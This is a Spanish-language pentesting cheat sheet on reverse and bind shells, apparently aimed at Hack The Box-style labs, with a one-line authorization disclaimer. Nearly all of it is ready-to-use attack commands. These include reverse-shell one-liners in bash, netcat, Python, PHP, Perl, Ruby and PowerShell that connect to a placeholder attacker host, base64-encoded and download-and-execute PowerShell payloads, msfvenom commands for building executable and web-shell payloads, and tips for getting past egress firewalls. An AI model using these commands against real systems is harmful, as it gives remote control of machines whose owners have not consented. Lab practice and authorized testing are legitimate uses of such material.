# Reverse Shells y TTY
> Reverse y bind shells en bash, nc, python, php y PowerShell, listeners, msfvenom básico, estabilización a TTY completa y troubleshooting.

Uso exclusivo en laboratorios y entornos con autorización explícita por escrito.

## Conceptos y variables

- Reverse shell: la víctima se conecta a ti. Es lo más usado porque los firewalls suelen permitir tráfico saliente.
- Bind shell: la víctima abre un puerto y tú te conectas. Útil cuando no hay salida hacia tu máquina.

En los ejemplos, sustituye `ATACANTE` por tu IP (en HTB, la de `tun0`) y `4444` por tu puerto.

```bash
# Tu IP en la VPN
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
```

Consejo: usa puertos que probablemente salgan (80, 443, 53). Si el 4444 no conecta, prueba el 443.

## Listeners

```bash
# Netcat clásico
nc -lvnp 4444

# Con historial y flechas (recomendado para shells sin TTY)
rlwrap nc -lvnp 4444

# Ncat con TLS (cifrado, evita inspección simple)
ncat --ssl -lvnp 443

# Socat (necesario para TTY completa directa)
socat -d -d TCP-LISTEN:4444,reuseaddr,fork STDOUT

# Metasploit
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; run"

# Pwncat-cs (estabiliza y sube archivos automáticamente)
pwncat-cs -lp 4444
```

Cuándo usarlo: `rlwrap nc` para el 90% de los casos; `pwncat-cs` si quieres que estabilice solo.

## Reverse shells en Linux

```bash
# Bash (necesita /dev/tcp, no existe en sh/dash)
bash -i >& /dev/tcp/ATACANTE/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATACANTE/4444 0>&1'

# Netcat con -e (versiones tradicionales)
nc -e /bin/bash ATACANTE 4444

# Netcat sin -e (openbsd): FIFO
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATACANTE 4444 > /tmp/f

# Python 3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATACANTE",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("ATACANTE",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATACANTE";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATACANTE",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

Dentro de una URL o parámetro, codifica los caracteres especiales (`&` = `%26`, espacio = `%20` o `+`). Una forma limpia es pasar el payload en base64:

```bash
echo 'bash -i >& /dev/tcp/ATACANTE/4444 0>&1' | base64 -w0
# En la víctima:
echo BASE64_AQUI | base64 -d | bash
```

## Reverse shells en Windows

```powershell
# PowerShell one-liner (TCPClient)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATACANTE',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$o=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($o,0,$o.Length);$s.Flush()};$c.Close()"
```

Para evitar problemas de comillas, codifícalo en UTF-16LE + base64:

```bash
# En Kali
echo -n '$c=New-Object Net.Sockets.TCPClient("ATACANTE",4444);...' | iconv -t UTF-16LE | base64 -w0
```

```powershell
# En la víctima
powershell -nop -w hidden -enc BASE64_AQUI

# Descargar y ejecutar un script remoto
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATACANTE/shell.ps1')"

# Netcat para Windows (si subes nc.exe)
nc.exe ATACANTE 4444 -e cmd.exe
```

Puedes servir los archivos con `python3 -m http.server 80` o `impacket-smbserver share . -smb2support`.

## Bind shells y msfvenom

```bash
# Bind con netcat (víctima)
nc -lvnp 4444 -e /bin/bash
# Atacante
nc 10.10.10.5 4444

# Bind con socat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

msfvenom genera payloads en el formato necesario:

```bash
# Listar payloads y formatos
msfvenom -l payloads | grep reverse_tcp
msfvenom -l formats

# Linux ELF (stageless: sin Metasploit handler, usa nc)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATACANTE LPORT=4444 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATACANTE LPORT=4444 -f exe -o shell.exe

# Meterpreter (requiere handler multi/handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATACANTE LPORT=4444 -f exe -o met.exe

# Web: PHP, JSP, WAR, ASPX
msfvenom -p php/reverse_php LHOST=ATACANTE LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATACANTE LPORT=4444 -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATACANTE LPORT=4444 -f aspx -o shell.aspx

# Evitar caracteres problemáticos en un exploit
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATACANTE LPORT=4444 -b "\x00\x0a\x0d" -f python
```

Nota sobre nombres: `windows/shell_reverse_tcp` (con guion bajo, stageless) se atrapa con `nc`. `windows/shell/reverse_tcp` (con barra, staged) necesita `multi/handler`. Confundirlos es el error número uno.

## Upgrade a TTY completa

Una shell recién recibida no tiene TTY: no funcionan Ctrl+C, flechas, `su`, `sudo` ni editores. Para arreglarlo:

```bash
# 1. En la víctima: crear pseudo-terminal
python3 -c 'import pty;pty.spawn("/bin/bash")'
# (alternativas)
script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null

# 2. Pasa la shell a segundo plano con Ctrl+Z

# 3. En tu Kali: modo raw y volver
stty raw -echo; fg
# (escribe 'reset' y Enter si se ve raro)

# 4. De vuelta en la víctima
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 columns 160
```

Para sacar las dimensiones correctas, en una terminal local de Kali ejecuta `stty size` y copia esos valores en el paso 4.

Alternativa con socat (TTY completa desde el inicio):

```bash
# Atacante
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Víctima (necesita socat; puedes subir un binario estático)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATACANTE:4444
```

En Windows no existe esto. Usa `rlwrap nc -lvnp 4444` o la shell interactiva de ConPtyShell:

```powershell
IEX(IWR http://ATACANTE/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ATACANTE 4444
```

## Troubleshooting

| Síntoma | Causa probable | Solución |
|---------|----------------|----------|
| Conecta y se cierra de inmediato | Payload no persistente o proceso hijo muerto | Usar `nohup`, `setsid` o `mkfifo` |
| `bad fd number` / `Syntax error: Bad fd` | Ejecutando bash-ism en `sh` | `bash -c '...'` |
| No llega nada | Firewall de salida | Probar 80, 443, 53; o bind shell |
| Shell sin eco o escalonada | Falta TTY | Usar el upgrade de arriba |
| Caracteres rotos al inyectar | Falta URL-encode | Base64 o `${IFS}` en vez de espacios |
| Se cuelga al pulsar Ctrl+C | Sin TTY | Primero estabilizar |
| `nc: invalid option -- e` | Netcat openbsd | Usar FIFO o python |

```bash
# Comprobar si la víctima tiene salida
curl http://ATACANTE:8000/test      # con python3 -m http.server 8000 abierto
ping -c1 ATACANTE
# Ver qué intérpretes hay disponibles
which python python3 nc ncat socat perl php bash
```

## Errores comunes

- Escribir mal LHOST o usar la IP de `eth0` en vez de `tun0` en HTB.
- Olvidar levantar el listener antes de disparar el payload.
- Elegir un puerto bloqueado por salida; prueba 443 o 80.
- Pegar un one-liner de bash en un entorno donde `/bin/sh` es dash: envuélvelo con `bash -c`.
- Confundir payloads staged y stageless con msfvenom.
- Hacer Ctrl+C directamente sobre la shell sin TTY: cierras tu conexión. Estabiliza antes.
- No reescribir `export TERM` y luego sufrir con `clear`, `nano` o `vim`.
- Olvidar escribir `reset` tras `stty raw -echo` cuando la terminal se ve rota.
- Subir binarios con arquitectura equivocada (x86 vs x64): revisa con `uname -m` o `systeminfo`.
- Dejar payloads y listeners activos tras terminar; en un engagement real, límpialos.
